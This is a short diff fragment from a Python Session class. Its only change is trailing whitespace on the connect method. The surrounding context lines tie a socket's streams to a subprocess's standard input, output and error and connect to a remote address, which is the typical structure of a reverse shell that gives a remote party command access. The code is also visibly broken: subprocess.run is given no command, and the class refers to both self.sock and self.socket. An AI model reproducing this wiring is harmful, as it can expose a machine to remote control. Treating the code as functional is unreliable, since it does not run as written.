@@ -62,7 +62,7 @@ class Session():
         self.stdin  = self.sock.makefile(mode='rb')
         subprocess.run(stderr=self.stderr, stdin=self.stdin, stdout=self.stdout)
 
-    def connect(self):
+    def connect(self): 
         try:
             self.socket.connect(self.address)
             print("connected")
